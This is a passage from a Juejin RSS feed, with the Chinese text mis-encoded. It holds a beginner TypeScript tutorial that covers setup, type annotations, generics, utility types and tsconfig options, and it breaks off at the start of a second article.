<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰]]></title>    <link>https://juejin.cn/post/7592518897463820340</link>    <guid>https://juejin.cn/post/7592518897463820340</guid>    <pubDate>2026-01-08T02:11:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592518897463820340" data-draft-id="7592518897463803956" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:11:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆå“ˆOå“ˆå“ˆå“ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3813562999914157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3813562999914157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆå“ˆOå“ˆå“ˆå“ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:11:30.000Z" title="Thu Jan 08 2026 02:11:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰</h2>
<blockquote>
<p><strong>ä¸€å¥è¯æ€»ç»“ï¼šTypeScript = JavaScript + å¼ºç±»å‹ç³»ç»Ÿ</strong><br/>
å®ƒä¸æ˜¯ä¸€é—¨æ–°è¯­è¨€ï¼Œè€Œæ˜¯ç»™ JS åŠ ä¸Šâ€œå®‰å…¨é”â€å’Œâ€œå¯¼èˆªä»ªâ€çš„è¶…é›†ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆ 2026 å¹´å¿…é¡»å­¦ TypeScriptï¼Ÿ</h3>
<h4 data-id="heading-2">âœ… 1. è§£å†³ JavaScript çš„æ ¸å¿ƒç—›ç‚¹</h4>
<ul>
<li><strong>å¼±ç±»å‹é™·é˜±</strong>ï¼šJS åœ¨è¿è¡Œæ—¶æ‰æŠ¥é”™ï¼ˆå¦‚ <code>"5" + 3 = "53"</code>ï¼‰ï¼ŒTS åœ¨<strong>ç¼–ç é˜¶æ®µå°±æ‹¦æˆªé”™è¯¯</strong>ã€‚</li>
<li><strong>ç»´æŠ¤å›°éš¾</strong>ï¼šå¤§å‹é¡¹ç›®ä¸­å˜é‡/å‡½æ•°ç”¨é€”æ¨¡ç³Šï¼ŒTS é€šè¿‡ç±»å‹æ³¨è§£è®©ä»£ç <strong>è‡ªè§£é‡Šã€æ˜“åä½œ</strong>ã€‚</li>
<li><strong>IDE ä½“éªŒå·®</strong>ï¼šJS ç¼ºä¹ç²¾å‡†æç¤ºï¼ŒTS è®© VS Code å®ç°<strong>æ™ºèƒ½è¡¥å…¨ã€è·³è½¬ã€é‡æ„</strong>ã€‚</li>
</ul>
<h4 data-id="heading-3">âœ… 2. è¡Œä¸šç°çŠ¶ï¼ˆ2026ï¼‰</h4>
<ul>
<li><strong>ä¸»æµæ¡†æ¶å…¨é¢æ‹¥æŠ± TS</strong>ï¼šVue 3ã€React 18+ã€Angularã€NestJS é»˜è®¤ä½¿ç”¨ TSã€‚</li>
<li><strong>æ‹›è˜ç¡¬æ€§è¦æ±‚</strong>ï¼š90% ä»¥ä¸Šä¸­é«˜çº§å‰ç«¯å²—ä½æ˜ç¡®è¦æ±‚ â€œç†Ÿç»ƒä½¿ç”¨ TypeScriptâ€ã€‚</li>
<li><strong>å¼€æºç”Ÿæ€æ”¯æŒå®Œå–„</strong>ï¼šå‡ ä¹æ‰€æœ‰ npm åŒ…éƒ½æä¾› <code>@types/xxx</code> ç±»å‹å£°æ˜ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å­¦ä¹ å»ºè®®</strong>ï¼šå…ˆæŒæ¡ JS åŸºç¡€ï¼Œå†å­¦ TSâ€”â€”å› ä¸º TS æ˜¯ JS çš„è¶…é›†ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">äºŒã€å¿«é€Ÿæ­å»ºå¼€å‘ç¯å¢ƒï¼ˆ2026 æ¨èæ–¹å¼ï¼‰</h3>
<h4 data-id="heading-5">1. å…¨å±€å®‰è£… TypeScript</h4>
<pre><code class="hljs language-perl" lang="perl">npm install -g typescript@5.<span class="hljs-number">7</span>  <span class="hljs-comment"># 2026 å¹´ä¸»æµç‰ˆæœ¬ä¸º TS 5.x</span>
</code></pre>
<h4 data-id="heading-6">2. åˆå§‹åŒ–é¡¹ç›®</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">mkdir</span> <span class="hljs-keyword">my</span>-ts-app &amp;&amp; cd <span class="hljs-keyword">my</span>-ts-app
npm init -<span class="hljs-keyword">y</span>
tsc --init  <span class="hljs-comment"># ç”Ÿæˆ tsconfig.json</span>
</code></pre>
<h4 data-id="heading-7">3. å¼€å‘å·¥å…·æ¨è</h4>
<ul>
<li>
<p><strong>ç¼–è¾‘å™¨</strong>ï¼šVS Codeï¼ˆå†…ç½® TS æ”¯æŒæœ€ä½³ï¼‰</p>
</li>
<li>
<p><strong>æ’ä»¶</strong>ï¼š<code>Code Runner</code>ï¼ˆä¸€é”®è¿è¡Œ <code>.ts</code> æ–‡ä»¶ï¼‰</p>
</li>
<li>
<p><strong>è°ƒè¯•</strong>ï¼šé…åˆ <code>ts-node</code> ç›´æ¥æ‰§è¡Œ TSï¼ˆæ— éœ€æ‰‹åŠ¨ç¼–è¯‘ï¼‰ï¼š</p>
<pre><code class="hljs">npm install -D ts-node
npx ts-node index.ts
</code></pre>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒè¯­æ³•è¯¦è§£ï¼ˆé™„ä»£ç ç¤ºä¾‹ï¼‰</h3>
<h4 data-id="heading-9">ğŸ”¹ 1. ç±»å‹æ³¨è§£ï¼ˆType Annotationï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">let age: <span class="hljs-attr">number</span> = <span class="hljs-number">25</span><span class="hljs-comment">;</span>
let name: <span class="hljs-attr">string</span> = <span class="hljs-string">"Alice"</span><span class="hljs-comment">;</span>
let isActive: <span class="hljs-attr">boolean</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
let hobbies: string<span class="hljs-section">[]</span> = <span class="hljs-section">["coding", "reading"]</span><span class="hljs-comment">;</span>
let tuple: <span class="hljs-section">[string, number]</span> = <span class="hljs-section">["Bob", 30]</span><span class="hljs-comment">; // å…ƒç»„</span>
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸€æ—¦æŒ‡å®šç±»å‹ï¼Œå°±ä¸èƒ½èµ‹å€¼å…¶ä»–ç±»å‹ï¼ˆé™¤éæ˜¯å­ç±»å‹æˆ–è”åˆç±»å‹ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-10">ğŸ”¹ 2. ç±»å‹æ¨æ–­ï¼ˆType Inferenceï¼‰â€”â€” èƒ½çœåˆ™çœï¼</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">price</span> = <span class="hljs-number">99.9</span><span class="hljs-comment">;     // TS è‡ªåŠ¨æ¨æ–­ä¸º number</span>
let <span class="hljs-attr">title</span> = <span class="hljs-string">"Hello"</span><span class="hljs-comment">;  // è‡ªåŠ¨æ¨æ–­ä¸º string</span>
// <span class="hljs-attr">price</span> = <span class="hljs-string">"free"</span><span class="hljs-comment">;    // âŒ æŠ¥é”™ï¼ç±»å‹å·²å›ºå®š</span>
</code></pre>
<blockquote>
<p>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šåˆå§‹åŒ–æ—¶èµ‹å€¼ â†’ çœç•¥ç±»å‹æ³¨è§£ï¼›å»¶è¿Ÿèµ‹å€¼ â†’ å¿…é¡»æ˜¾å¼å£°æ˜ç±»å‹ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-11">ğŸ”¹ 3. è”åˆç±»å‹ &amp; å­—é¢é‡ç±»å‹</h4>
<pre><code class="hljs language-ini" lang="ini">let status: "loading" | "success" | <span class="hljs-attr">"error"</span> = <span class="hljs-string">"loading"</span><span class="hljs-comment">;</span>
let id: string | <span class="hljs-attr">number</span> = <span class="hljs-string">"user_123"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">id</span> = <span class="hljs-number">456</span><span class="hljs-comment">; // âœ… åˆæ³•</span>
</code></pre>
<hr/>
<h4 data-id="heading-12">ğŸ”¹ 4. æ¥å£ï¼ˆinterfaceï¼‰ vs ç±»å‹åˆ«åï¼ˆtypeï¼‰</h4>

























<table><thead><tr><th>ç‰¹æ€§</th><th><code>interface</code></th><th><code>type</code></th></tr></thead><tbody><tr><td>å¯åˆå¹¶å£°æ˜</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ”¯æŒ extends/implements</td><td>âœ…</td><td>âŒï¼ˆä½†å¯ç”¨äº¤å‰ç±»å‹ <code>&amp;</code> æ¨¡æ‹Ÿï¼‰</td></tr><tr><td>å¯å®šä¹‰åŸå§‹ç±»å‹/è”åˆç±»å‹</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<p><strong>æ¨èç”¨æ³•</strong>ï¼š</p>
<ul>
<li>å¯¹è±¡ç»“æ„ â†’ ä¼˜å…ˆç”¨ <code>interface</code></li>
<li>è”åˆç±»å‹/å…ƒç»„/å·¥å…·ç±»å‹ â†’ ç”¨ <code>type</code></li>
</ul>
<pre><code class="hljs language-ini" lang="ini">interface User {
  name: string<span class="hljs-comment">;</span>
  age: number<span class="hljs-comment">;</span>
}

type <span class="hljs-attr">ID</span> = string | number<span class="hljs-comment">;</span>
type <span class="hljs-attr">Status</span> = <span class="hljs-string">"active"</span> | <span class="hljs-string">"inactive"</span><span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h4 data-id="heading-13">ğŸ”¹ 5. å‡½æ•°ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼1ï¼šå‚æ•°+è¿”å›å€¼æ³¨è§£</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>!`</span>;
}

<span class="hljs-comment">// æ–¹å¼2ï¼šå‡½æ•°ç±»å‹åˆ«å</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;

<span class="hljs-comment">// å¯é€‰å‚æ•° &amp; é»˜è®¤å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age?: <span class="hljs-built_in">number</span>, role = <span class="hljs-string">"user"</span></span>) {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-14">ğŸ”¹ 6. ç±»ï¼ˆClassï¼‰ä¸è®¿é—®ä¿®é¥°ç¬¦</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">move</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is moving`</span>); }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> barks!`</span>); <span class="hljs-comment">// âœ… protected å…è®¸å­ç±»è®¿é—®</span>
  }
}
</code></pre>
<ul>
<li><code>public</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä»»ä½•åœ°æ–¹å¯è®¿é—®</li>
<li><code>private</code>ï¼šä»…ç±»å†…éƒ¨</li>
<li><code>protected</code>ï¼šç±»åŠå…¶å­ç±»</li>
</ul>
<hr/>
<h4 data-id="heading-15">ğŸ”¹ 7. æ³›å‹ï¼ˆGenericsï¼‰â€”â€” å†™é«˜å¤ç”¨ç»„ä»¶çš„å…³é”®</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">function <span class="hljs-title">identity</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">arg: T</span>): T</span> {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">let</span> output = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> nums = identity&lt;number[]&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
</code></pre>
<blockquote>
<p>ğŸ’¡ æ³›å‹å¸¸ç”¨äºï¼šæ•°ç»„æ“ä½œã€API è¯·æ±‚å°è£…ã€çŠ¶æ€ç®¡ç†ç­‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-16">ğŸ”¹ 8. å†…ç½®å·¥å…·ç±»å‹ï¼ˆUtility Typesï¼‰</h4>
<p>TS å†…ç½®äº†å¤šä¸ªå®ç”¨ç±»å‹ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">interface Todo {
  title: string<span class="hljs-comment">;</span>
  completed: boolean<span class="hljs-comment">;</span>
}

// Partial&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§å˜ä¸ºå¯é€‰
type <span class="hljs-attr">PartialTodo</span> = Partial&lt;Todo&gt;<span class="hljs-comment">;</span>

// Readonly&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§åªè¯»
const todo: Readonly&lt;Todo&gt; = { title: "Learn TS", completed: false }<span class="hljs-comment">;</span>
// <span class="hljs-attr">todo.title</span> = <span class="hljs-string">"new"</span><span class="hljs-comment">; // âŒ æŠ¥é”™</span>

// Pick&lt;T, K&gt;ï¼šé€‰å–éƒ¨åˆ†å±æ€§
type <span class="hljs-attr">TodoPreview</span> = Pick&lt;Todo, <span class="hljs-string">"title"</span>&gt;<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-17">å››ã€é…ç½®æ–‡ä»¶ <code>tsconfig.json</code> æ ¸å¿ƒé€‰é¡¹ï¼ˆ2026 æ¨èé…ç½®ï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES2022"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// ç¼–è¯‘ç›®æ ‡ JS ç‰ˆæœ¬</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NodeNext"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// æ¨¡å—ç³»ç»Ÿï¼ˆå…¼å®¹ Node.js ESMï¼‰</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>              <span class="hljs-comment">// å¯ç”¨æ‰€æœ‰ä¸¥æ ¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// å…¼å®¹ CommonJS ä¸ ESM</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// è·³è¿‡ .d.ts ç±»å‹æ£€æŸ¥ï¼ˆåŠ é€Ÿç¼–è¯‘ï¼‰</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// è¾“å‡ºç›®å½•</span>
    <span class="hljs-attr">"rootDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./src"</span>           <span class="hljs-comment">// æºç ç›®å½•</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/**/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>âœ… <strong>å»ºè®®å¼€å¯ <code>"strict": true</code></strong> â€”â€” è¿™æ˜¯ TS å‘æŒ¥æœ€å¤§ä»·å€¼çš„å…³é”®ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-18">äº”ã€å¸¸è§é—®é¢˜ &amp; æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-19">â“ Q1ï¼šå¦‚ä½•å¤„ç†ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ç±»å‹å£°æ˜ï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash">npm install @types/lodash  <span class="hljs-comment"># å®‰è£…å®˜æ–¹ç±»å‹åŒ…</span>
</code></pre>
<p>è‹¥æ—  <code>@types/xxx</code>ï¼Œå¯ä¸´æ—¶ç”¨ <code>any</code> æˆ–è‡ªè¡Œå£°æ˜æ¨¡å—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// types.d.ts</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">"my-legacy-lib"</span>;
</code></pre>
<h4 data-id="heading-20">â“ Q2ï¼šä»€ä¹ˆæ—¶å€™ç”¨ <code>as</code> ç±»å‹æ–­è¨€ï¼Ÿ</h4>
<ul>
<li>
<p>ä»…åœ¨ä½ <strong>100% ç¡®å®šç±»å‹</strong>æ—¶ä½¿ç”¨ï¼ˆå¦‚ DOM å…ƒç´ ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">input</span> = document.getElementById(<span class="hljs-string">"email"</span>) as HTMLInputElement<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p>é¿å…æ»¥ç”¨ï¼å¦åˆ™ä¼šç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œå¤±å» TS ä¼˜åŠ¿ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-21">å…­ã€å­¦ä¹ èµ„æºæ¨èï¼ˆ2026 æ›´æ–°ï¼‰</h3>

























<table><thead><tr><th>ç±»å‹</th><th>æ¨è</th></tr></thead><tbody><tr><td>ğŸ“š ä¸­æ–‡æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fzh%2F" target="_blank" title="https://www.typescriptlang.org/zh/" ref="nofollow noopener noreferrer">TypeScript å®˜æ–¹ä¸­æ–‡ç«™</a></td></tr><tr><td>ğŸ“˜ å…¥é—¨æ•™ç¨‹</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwangdoc.com%2Ftypescript%2F" target="_blank" title="https://wangdoc.com/typescript/" ref="nofollow noopener noreferrer">é˜®ä¸€å³°ã€ŠTypeScript æ•™ç¨‹ã€‹</a></td></tr><tr><td>ğŸ¥ è§†é¢‘è¯¾ç¨‹</td><td>Bilibili æœç´¢ â€œTypeScript 2026 å®æˆ˜â€</td></tr><tr><td>ğŸ’» åœ¨çº¿ç»ƒä¹ </td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.typescriptlang.org%2Fplay" target="_blank" title="https://www.typescriptlang.org/play" ref="nofollow noopener noreferrer">TS Playground</a></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-22">ç»“è¯­</h3>
<blockquote>
<p><strong>TypeScript ä¸æ˜¯å¢åŠ è´Ÿæ‹…ï¼Œè€Œæ˜¯å‡å°‘æœªæ¥ 80% çš„è°ƒè¯•æ—¶é—´ã€‚</strong><br/>
2026 å¹´ï¼Œå®ƒå·²ä»å‰ç«¯â€œåŠ åˆ†é¡¹â€å˜ä¸ºâ€œå¿…å¤‡æŠ€èƒ½â€ã€‚ä»ä»Šå¤©å¼€å§‹ï¼Œç”¨ TS é‡æ„ä½ çš„ä¸‹ä¸€ä¸ªé¡¹ç›®å§ï¼</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£]]></title>    <link>https://juejin.cn/post/7592552501579202586</link>    <guid>https://juejin.cn/post/7592552501579202586</guid>    <pubDate>2026-01-08T02:17:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579202586" data-draft-id="7592559120117530670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-08T02:17:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" 